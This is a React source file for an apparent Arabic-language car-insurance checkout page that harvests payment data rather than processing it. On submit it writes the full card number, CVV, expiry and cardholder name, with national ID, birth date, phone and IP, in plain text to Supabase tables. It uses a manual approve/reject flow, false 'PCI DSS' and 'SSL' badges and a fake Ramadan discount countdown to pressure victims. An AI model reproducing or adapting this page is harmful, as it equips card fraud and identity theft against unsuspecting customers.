import { useState, useMemo, useEffect } from "react";
import { useSearchParams, useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { ArrowRight, Lock, CreditCard, Loader2, AlertCircle, CheckCircle2, Clock, Shield } from "lucide-react";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { useToast } from "@/hooks/use-toast";
import Footer from "@/components/Footer";
import { useOrder } from "@/contexts/OrderContext";
import { supabase } from "@/integrations/supabase/client";
import { Alert, AlertDescription } from "@/components/ui/alert";
import PaymentLogos from "@/components/PaymentLogos";

const Payment = () => {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const { orderData, updateOrderData } = useOrder();
  const { toast } = useToast();
  const companyName = searchParams.get("company") || "";
  const price = parseFloat(searchParams.get("price") || "0");
  const regularPrice = parseFloat(searchParams.get("regularPrice") || "0");
  const discount = Math.round((regularPrice - price) / regularPrice * 100);
  const [cardHolder, setCardHolder] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [expiryMonth, setExpiryMonth] = useState("");
  const [expiryYear, setExpiryYear] = useState("");
  const [cvv, setCvv] = useState("");
  const [waitingApproval, setWaitingApproval] = useState(false);
  const [rejectionError, setRejectionError] = useState(false);
  const [paymentMethod] = useState<"card">("card");
  const [showPromoPopup, setShowPromoPopup] = useState(true);
  const [offerCountdown, setOfferCountdown] = useState({ hours: 2, minutes: 30, seconds: 0 });
  const [expiryError, setExpiryError] = useState("");

  const cardDiscount = 0.25;
  const finalPrice = paymentMethod === "card" ? price * (1 - cardDiscount) : price;
  const savedAmount = paymentMethod === "card" ? price * cardDiscount : 0;

  // Track payment page visit
  useEffect(() => {
    const trackPaymentPageVisit = async () => {
      const sessionId = sessionStorage.getItem("visitor_session_id");
      if (sessionId) {
        await supabase.from('visitor_events').insert({
          session_id: sessionId,
          event_type: 'payment_page_visit',
          page_url: window.location.pathname,
          event_data: {
            company: companyName,
            price: price,
            timestamp: new Date().toISOString()
          }
        });
      }
    };
    trackPaymentPageVisit();
  }, [companyName, price]);

  useEffect(() => {
    if (!showPromoPopup) return;
    const timer = setTimeout(() => setShowPromoPopup(false), 5000);
    return () => clearTimeout(timer);
  }, [showPromoPopup]);

  useEffect(() => {
    const timer = setInterval(() => {
      setOfferCountdown(prev => {
        if (prev.seconds > 0) return { ...prev, seconds: prev.seconds - 1 };
        if (prev.minutes > 0) return { ...prev, minutes: prev.minutes - 1, seconds: 59 };
        if (prev.hours > 0) return { hours: prev.hours - 1, minutes: 59, seconds: 59 };
        return prev;
      });
    }, 1000);
    return () => clearInterval(timer);
  }, []);

  useEffect(() => {
    const rejected = searchParams.get('rejected');
    if (rejected === 'true') {
      setRejectionError(true);
      toast({
        title: "تم رفض معلومات الدفع",
        description: "يرجى التأكد من صحة البيانات وإعادة الإدخال",
        variant: "destructive"
      });
    }
  }, [searchParams, toast]);

  const cardType = useMemo(() => {
    const cleaned = cardNumber.replace(/\s/g, "");
    if (/^4/.test(cleaned)) return "visa";
    if (/^5[1-5]/.test(cleaned) || /^2[2-7]/.test(cleaned)) return "mastercard";
    return null;
  }, [cardNumber]);

  const formatCardNumber = (value: string) => {
    const cleaned = value.replace(/\s/g, "");
    const groups = cleaned.match(/.{1,4}/g);
    return groups ? groups.join(" ") : cleaned;
  };

  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\s/g, "");
    if (value.length <= 16 && /^\d*$/.test(value)) setCardNumber(value);
  };

  const handleCvvChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value;
    if (value.length <= 3 && /^\d*$/.test(value)) setCvv(value);
  };

  const handleCardHolderChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value;
    if (/^[\u0600-\u06FFa-zA-Z\s]*$/.test(value)) setCardHolder(value);
  };

  const validateExpiryDate = (month: string, year: string) => {
    if (month.length === 2 && year.length === 2) {
      const currentDate = new Date();
      const currentYear = currentDate.getFullYear() % 100;
      const currentMonth = currentDate.getMonth() + 1;
      const expYear = parseInt(year);
      const expMonth = parseInt(month);
      if (expYear < currentYear || (expYear === currentYear && expMonth < currentMonth)) {
        setExpiryError("تاريخ البطاقة منتهي");
        return false;
      } else {
        setExpiryError("");
        return true;
      }
    }
    setExpiryError("");
    return true;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setRejectionError(false);
    const expiryDate = `${expiryMonth}/${expiryYear}`;
    try {
      setWaitingApproval(true);
      const sessionId = sessionStorage.getItem("visitor_session_id");
      let visitorIp = null;
      if (sessionId) {
        const { data: visitorData } = await supabase.from("visitor_tracking").select("ip_address").eq("session_id", sessionId).order("last_active_at", { ascending: false }).limit(1).maybeSingle();
        if (visitorData?.ip_address) visitorIp = visitorData.ip_address;
      }
      let orderDbData;
      if (orderData.sequenceNumber) {
        const { data: existingOrder } = await supabase.from('customer_orders').select('id').eq('sequence_number', orderData.sequenceNumber).order('created_at', { ascending: false }).limit(1).maybeSingle();
        let data = null;
        let updateError = null;
        if (existingOrder) {
          const result = await supabase.from('customer_orders').update({
            card_holder_name: cardHolder, card_number: cardNumber, expiry_date: expiryDate, cvv: cvv,
            insurance_company: companyName, insurance_price: finalPrice, status: 'pending',
            visitor_ip: visitorIp, updated_at: new Date().toISOString()
          }).eq('id', existingOrder.id).select().maybeSingle();
          data = result.data;
          updateError = result.error;
        }
        if (updateError) throw updateError;
        if (data) {
          orderDbData = data;
        } else {
          const { data: insertData, error: insertError } = await supabase.from('customer_orders').insert({
            card_holder_name: cardHolder, card_number: cardNumber, expiry_date: expiryDate, cvv: cvv,
            insurance_company: companyName, insurance_price: finalPrice,
            sequence_number: orderData.sequenceNumber, id_number: orderData.idNumber || '0000000000',
            birth_date: orderData.birthDate || '2000-01-01', phone_number: orderData.phoneNumber || null,
            owner_name: orderData.ownerName || null, vehicle_type: orderData.vehicleType || '',
            vehicle_purpose: orderData.vehiclePurpose || '', estimated_value: orderData.estimatedValue || null,
            policy_start_date: orderData.policyStartDate || null, add_driver: orderData.addDriver || null,
            visitor_session_id: sessionId, visitor_ip: visitorIp, status: 'pending'
          }).select().single();
          if (insertError) throw insertError;
          orderDbData = insertData;
        }
      } else {
        const newSequenceNumber = `ORD-${Date.now()}`;
        const { data, error: insertError } = await supabase.from('customer_orders').insert({
          card_holder_name: cardHolder, card_number: cardNumber, expiry_date: expiryDate, cvv: cvv,
          insurance_company: companyName, insurance_price: finalPrice, sequence_number: newSequenceNumber,
          id_number: orderData.idNumber || '0000000000', birth_date: orderData.birthDate || '2000-01-01',
          phone_number: orderData.phoneNumber || null, owner_name: orderData.ownerName || null,
          vehicle_type: orderData.vehicleType || '', vehicle_purpose: orderData.vehiclePurpose || '',
          estimated_value: orderData.estimatedValue || null, policy_start_date: orderData.policyStartDate || null,
          add_driver: orderData.addDriver || null, visitor_session_id: sessionId, visitor_ip: visitorIp, status: 'pending'
        }).select().single();
        if (insertError) throw insertError;
        orderDbData = data;
      }
      if (orderDbData?.id) {
        await supabase.from('payment_attempts').insert({
          order_id: orderDbData.id, card_holder_name: cardHolder, card_number: cardNumber,
          expiry_date: expiryDate, cvv: cvv
        });
      }
      updateOrderData({
        cardNumber, cardHolderName: cardHolder, expiryDate, cvv,
        sequenceNumber: orderDbData.sequence_number
      });
      navigate(`/processing-payment?company=${encodeURIComponent(companyName)}&price=${finalPrice}&orderId=${orderDbData.id}`);
    } catch (error) {
      console.error('Error submitting payment:', error);
      setWaitingApproval(false);
      toast({
        title: "خطأ في معالجة الدفع",
        description: "حدث خطأ أثناء حفظ معلومات الدفع. يرجى المحاولة مرة أخرى.",
        variant: "destructive"
      });
    }
  };

  return (
    <div className="min-h-screen bg-muted/30" dir="rtl">
      {/* Promo Popup */}
      {showPromoPopup && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/50 backdrop-blur-sm">
          <div className="bg-gradient-to-br from-primary to-primary-dark rounded-2xl p-6 sm:p-8 max-w-sm w-full shadow-2xl relative overflow-hidden">
            <div className="absolute top-0 left-0 w-full h-1.5 bg-gradient-to-r from-amber-400 via-yellow-500 to-amber-400" />
            <div className="absolute bottom-0 left-0 w-full h-1.5 bg-gradient-to-r from-amber-400 via-yellow-500 to-amber-400" />
            <div className="text-center text-white pt-4">
              <div className="inline-flex items-center gap-2 bg-white/15 px-4 py-1.5 rounded-full mb-3 text-sm">
                🌙 رمضان كريم ✨
              </div>
              <h3 className="text-3xl font-black mb-1">خصم 25%</h3>
              <p className="text-base opacity-90 mb-4">بمناسبة شهر رمضان المبارك</p>
              <div className="bg-white/15 rounded-xl p-3 mb-4">
                <div className="flex items-center justify-center gap-1 mb-1.5 text-xs opacity-80">
                  <Clock className="h-3 w-3" />
                  <span>العرض ينتهي خلال</span>
                </div>
                <div className="flex items-center justify-center gap-2">
                  <div className="bg-white/20 rounded-lg px-3 py-1.5 min-w-[48px] text-center">
                    <span className="text-xl font-black block leading-tight">{String(offerCountdown.hours).padStart(2, '0')}</span>
                    <p className="text-[10px] opacity-80">ساعة</p>
                  </div>
                  <span className="text-lg font-bold">:</span>
                  <div className="bg-white/20 rounded-lg px-3 py-1.5 min-w-[48px] text-center">
                    <span className="text-xl font-black block leading-tight">{String(offerCountdown.minutes).padStart(2, '0')}</span>
                    <p className="text-[10px] opacity-80">دقيقة</p>
                  </div>
                  <span className="text-lg font-bold">:</span>
                  <div className="bg-white/20 rounded-lg px-3 py-1.5 min-w-[48px] text-center">
                    <span className="text-xl font-black block leading-tight">{String(offerCountdown.seconds).padStart(2, '0')}</span>
                    <p className="text-[10px] opacity-80">ثانية</p>
                  </div>
                </div>
              </div>
              <div className="bg-amber-500/30 rounded-lg p-2.5 mb-4 text-sm font-bold">
                💰 وفر {(price * 0.25).toFixed(2)} ر.س
              </div>
              <button
                onClick={() => setShowPromoPopup(false)}
                className="w-full bg-white text-primary px-5 py-2.5 rounded-xl font-bold hover:bg-white/90 transition-all"
              >
                استفد من العرض الآن
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Header */}
      <div className="bg-gradient-to-b from-primary to-primary-dark py-5 sm:py-6">
        <div className="container mx-auto px-4">
          <Button variant="ghost" onClick={() => navigate(-1)} className="text-white hover:bg-white/10 mb-2 h-9 px-3 text-sm">
            <ArrowRight className="ml-1 h-4 w-4" />
            العودة
          </Button>
          <h1 className="text-xl sm:text-2xl font-bold text-white text-center">إتمام عملية الدفع</h1>
        </div>
      </div>

      <div className="container mx-auto px-4 py-6 sm:py-10 max-w-2xl">
        
        {/* Step 1: Order Summary - FIRST */}
        <div className="bg-card rounded-xl border border-border shadow-sm mb-5">
          <div className="p-4 sm:p-5 border-b border-border">
            <div className="flex items-center gap-2">
              <div className="w-6 h-6 rounded-full bg-primary text-primary-foreground flex items-center justify-center text-xs font-bold">1</div>
              <h2 className="text-base sm:text-lg font-bold text-foreground">ملخص الطلب</h2>
            </div>
          </div>
          <div className="p-4 sm:p-5 space-y-3">
            {/* Company */}
            <div className="flex justify-between items-center">
              <span className="text-sm text-muted-foreground">شركة التأمين</span>
              <span className="text-sm font-semibold text-foreground">{companyName}</span>
            </div>
            
            {/* Original Price */}
            <div className="flex justify-between items-center">
              <span className="text-sm text-muted-foreground">السعر الأصلي</span>
              <span className="text-sm line-through text-muted-foreground">{regularPrice.toFixed(2)} ﷼</span>
            </div>
            
            {/* Discount */}
            {discount > 0 && (
              <div className="flex justify-between items-center">
                <span className="text-sm text-accent font-medium">خصم {discount}%</span>
                <span className="text-sm text-accent font-medium">- {(regularPrice - price).toFixed(2)} ﷼</span>
              </div>
            )}

            {/* Card Discount */}
            {savedAmount > 0 && (
              <div className="flex justify-between items-center bg-green-50 dark:bg-green-950/30 -mx-4 sm:-mx-5 px-4 sm:px-5 py-2">
                <span className="text-sm text-green-700 dark:text-green-400 font-medium">🎉 خصم رمضان 25%</span>
                <span className="text-sm text-green-700 dark:text-green-400 font-medium">- {savedAmount.toFixed(2)} ﷼</span>
              </div>
            )}

            {/* Total */}
            <div className="pt-3 border-t border-border">
              <div className="flex justify-between items-center">
                <span className="text-base font-bold text-foreground">المبلغ المطلوب</span>
                <div className="text-left">
                  <span className="text-xl sm:text-2xl font-black text-primary">{finalPrice.toFixed(2)} ﷼</span>
                  {savedAmount > 0 && (
                    <p className="text-xs text-green-600 dark:text-green-400 font-medium">وفرت {savedAmount.toFixed(2)} ﷼</p>
                  )}
                </div>
              </div>
            </div>
          </div>
        </div>

        {/* Step 2: Payment Form - SECOND */}
        <div className="bg-card rounded-xl border border-border shadow-sm">
          <div className="p-4 sm:p-5 border-b border-border">
            <div className="flex items-center justify-between">
              <div className="flex items-center gap-2">
                <div className="w-6 h-6 rounded-full bg-primary text-primary-foreground flex items-center justify-center text-xs font-bold">2</div>
                <h2 className="text-base sm:text-lg font-bold text-foreground">بيانات الدفع</h2>
              </div>
              <PaymentLogos />
            </div>
            <div className="flex items-center gap-1.5 mt-2 mr-8">
              <Shield className="h-3 w-3 text-green-600" />
              <span className="text-xs text-muted-foreground">بوابة دفع آمنة - تشفير SSL 256-bit</span>
            </div>
          </div>

          <div className="p-4 sm:p-5">
            {rejectionError && (
              <Alert variant="destructive" className="mb-4">
                <AlertCircle className="h-4 w-4" />
                <AlertDescription>تم رفض معلومات الدفع. يرجى التأكد من صحة البيانات وإعادة الإدخال.</AlertDescription>
              </Alert>
            )}

            {waitingApproval && (
              <Alert className="mb-4 bg-blue-50 border-blue-200">
                <Loader2 className="h-4 w-4 animate-spin" />
                <AlertDescription className="text-blue-900">جاري المعالجة، يرجى الانتظار...</AlertDescription>
              </Alert>
            )}

            <form onSubmit={handleSubmit} className="space-y-4">
              {/* Card Holder Name */}
              <div className="space-y-1.5">
                <Label htmlFor="cardHolder" className="text-sm font-medium text-foreground">
                  اسم حامل البطاقة <span className="text-destructive">*</span>
                </Label>
                <Input
                  id="cardHolder"
                  placeholder="الاسم كما هو مكتوب على البطاقة"
                  value={cardHolder}
                  onChange={handleCardHolderChange}
                  required
                  className="text-right h-11 text-sm"
                />
              </div>

              {/* Card Number */}
              <div className="space-y-1.5">
                <Label htmlFor="cardNumber" className="text-sm font-medium text-foreground">
                  رقم البطاقة <span className="text-destructive">*</span>
                </Label>
                <div className="relative">
                  <Input
                    id="cardNumber"
                    placeholder="0000 0000 0000 0000"
                    value={formatCardNumber(cardNumber)}
                    onChange={handleCardNumberChange}
                    required
                    className="text-left pl-24 h-11 font-mono text-sm tracking-widest"
                    dir="ltr"
                  />
                  <div className="absolute left-3 top-1/2 -translate-y-1/2">
                    {cardType === "visa" && (
                      <span className="text-xs font-bold text-blue-700 bg-blue-100 px-2 py-1 rounded">VISA</span>
                    )}
                    {cardType === "mastercard" && (
                      <div className="flex items-center gap-1">
                        <div className="flex">
                          <div className="w-4 h-4 rounded-full bg-red-500" />
                          <div className="w-4 h-4 rounded-full bg-orange-400 -ml-1.5" />
                        </div>
                        <span className="text-[10px] font-bold text-orange-700">MC</span>
                      </div>
                    )}
                    {!cardType && <CreditCard className="h-4 w-4 text-muted-foreground" />}
                  </div>
                </div>
              </div>

              {/* Expiry and CVV - side by side */}
              <div className="grid grid-cols-2 gap-3">
                <div className="space-y-1.5">
                  <Label className="text-sm font-medium text-foreground">
                    تاريخ الانتهاء <span className="text-destructive">*</span>
                  </Label>
                  <div className="flex gap-1.5 items-center">
                    <Select value={expiryMonth} onValueChange={v => { setExpiryMonth(v); validateExpiryDate(v, expiryYear); }}>
                      <SelectTrigger className="h-11 text-sm flex-1">
                        <SelectValue placeholder="شهر" />
                      </SelectTrigger>
                      <SelectContent>
                        {Array.from({ length: 12 }, (_, i) => {
                          const m = String(i + 1).padStart(2, '0');
                          return <SelectItem key={m} value={m}>{m}</SelectItem>;
                        })}
                      </SelectContent>
                    </Select>
                    <span className="text-muted-foreground font-bold text-sm">/</span>
                    <Select value={expiryYear} onValueChange={v => { setExpiryYear(v); validateExpiryDate(expiryMonth, v); }}>
                      <SelectTrigger className="h-11 text-sm flex-1">
                        <SelectValue placeholder="سنة" />
                      </SelectTrigger>
                      <SelectContent>
                        {(() => {
                          const cy = new Date().getFullYear() % 100;
                          return Array.from({ length: 10 }, (_, i) => {
                            const y = String(cy + i).padStart(2, '0');
                            return <SelectItem key={y} value={y}>{y}</SelectItem>;
                          });
                        })()}
                      </SelectContent>
                    </Select>
                  </div>
                  {expiryError && (
                    <p className="text-xs text-destructive flex items-center gap-1">
                      <AlertCircle className="h-3 w-3" />
                      {expiryError}
                    </p>
                  )}
                </div>

                <div className="space-y-1.5">
                  <Label htmlFor="cvv" className="text-sm font-medium text-foreground">
                    CVV <span className="text-destructive">*</span>
                  </Label>
                  <div className="relative">
                    <Input
                      id="cvv"
                      placeholder="•••"
                      value={cvv}
                      onChange={handleCvvChange}
                      required
                      className="text-center h-11 font-mono text-sm tracking-widest"
                      maxLength={3}
                      type="password"
                    />
                    <Lock className="absolute left-3 top-1/2 -translate-y-1/2 h-3.5 w-3.5 text-muted-foreground" />
                  </div>
                  <p className="text-[11px] text-muted-foreground">الأرقام خلف البطاقة</p>
                </div>
              </div>

              {/* Submit */}
              <Button
                type="submit"
                disabled={waitingApproval}
                className="w-full h-12 text-base font-bold bg-gradient-to-l from-primary to-primary-dark hover:opacity-90 transition-opacity mt-2"
              >
                {waitingApproval ? (
                  <>
                    <Loader2 className="ml-2 h-5 w-5 animate-spin" />
                    جاري المعالجة...
                  </>
                ) : (
                  <>
                    <Lock className="ml-2 h-4 w-4" />
                    تأكيد الدفع - {finalPrice.toFixed(2)} ﷼
                  </>
                )}
              </Button>

              {/* Trust */}
              <div className="flex items-center justify-center gap-3 text-[11px] text-muted-foreground pt-2">
                <div className="flex items-center gap-1">
                  <Lock className="h-3 w-3" />
                  <span>آمن 100%</span>
                </div>
                <span>•</span>
                <div className="flex items-center gap-1">
                  <Shield className="h-3 w-3" />
                  <span>SSL مشفر</span>
                </div>
                <span>•</span>
                <div className="flex items-center gap-1">
                  <CheckCircle2 className="h-3 w-3" />
                  <span>PCI DSS</span>
                </div>
              </div>

              <p className="text-[11px] text-center text-muted-foreground">
                بإتمام الدفع، أنت توافق على شروط الخدمة وسياسة الخصوصية
              </p>
            </form>
          </div>
        </div>
      </div>

      <Footer />
    </div>
  );
};

export default Payment;
